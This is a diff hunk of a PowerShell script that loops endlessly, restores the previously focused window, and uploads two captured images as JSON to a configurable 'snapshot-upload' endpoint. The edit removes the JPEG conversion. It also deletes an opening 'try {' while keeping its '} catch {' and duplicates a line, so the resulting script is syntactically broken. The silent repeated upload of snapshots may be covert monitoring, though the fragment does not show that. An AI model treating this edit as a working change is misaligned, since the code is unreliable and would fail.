@@ -173,18 +173,15 @@ while ($true) {
     try { [Win32]::SetForegroundWindow($prev) | Out-Null } catch {}
 
     $payload = @{ images = @($img1, $img2) } | ConvertTo-Json -Depth 3
-    $j1 = ConvertDataUrlToJpeg $img1 80
-    $j2 = ConvertDataUrlToJpeg $img2 80
-    if ($j1 -and $j2) { $payload = @{ images = @($j1, $j2) } | ConvertTo-Json -Depth 3 }
-    try {
-      Invoke-WebRequest -Uri $Url -Method Post -ContentType 'application/json' -Body $payload -ErrorAction Stop | Out-Null
+    $payload = @{ images = @($img1, $img2) } | ConvertTo-Json -Depth 3
+    Invoke-WebRequest -Uri $Url -Method Post -ContentType 'application/json' -Body $payload -ErrorAction Stop | Out-Null
     } catch {
       $urlSingle = $Url -replace 'snapshot-upload2','snapshot-upload'
       try {
-        $payload1 = @{ image = $j1 } | ConvertTo-Json -Depth 3
+        $payload1 = @{ image = $img1 } | ConvertTo-Json -Depth 3
         Invoke-WebRequest -Uri $urlSingle -Method Post -ContentType 'application/json' -Body $payload1 -ErrorAction Stop | Out-Null
         Start-Sleep -Milliseconds 300
-        $payload2 = @{ image = $j2 } | ConvertTo-Json -Depth 3
+        $payload2 = @{ image = $img2 } | ConvertTo-Json -Depth 3
         Invoke-WebRequest -Uri $urlSingle -Method Post -ContentType 'application/json' -Body $payload2 -ErrorAction Stop | Out-Null
       } catch { throw $_ }
     }
